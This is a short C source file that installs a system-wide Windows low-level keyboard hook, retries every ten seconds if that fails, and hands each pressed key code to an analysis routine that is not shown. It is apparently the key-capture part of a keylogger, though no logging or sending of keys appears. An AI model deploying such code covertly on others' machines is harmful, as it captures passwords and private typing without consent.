#include "header.h"

HHOOK hook;
KBDLLHOOKSTRUCT keyboard_struct;

void StartKeyBoardHook()
{
	if (!(hook = SetWindowsHookEx(WH_KEYBOARD_LL, HookProcedure, NULL, 0)))
	{
		// HOOK ERROR
		Sleep(10000);
		StartKeyBoardHook();
	}
}


LRESULT __stdcall HookProcedure(int nCode, WPARAM wParam, LPARAM lParam)
{
	char c;
	bool maj;
	if (nCode >= 0)
	{
		if (wParam == WM_KEYDOWN)
		{
			keyboard_struct = *((KBDLLHOOKSTRUCT*)lParam);
			if (keyboard_struct.vkCode != 0)
				analyse_keyboard_status(keyboard_struct.vkCode);
		}
	}
	return CallNextHookEx(hook, nCode, wParam, lParam);
}

void ReleaseHook()
{
	UnhookWindowsHookEx(hook);
}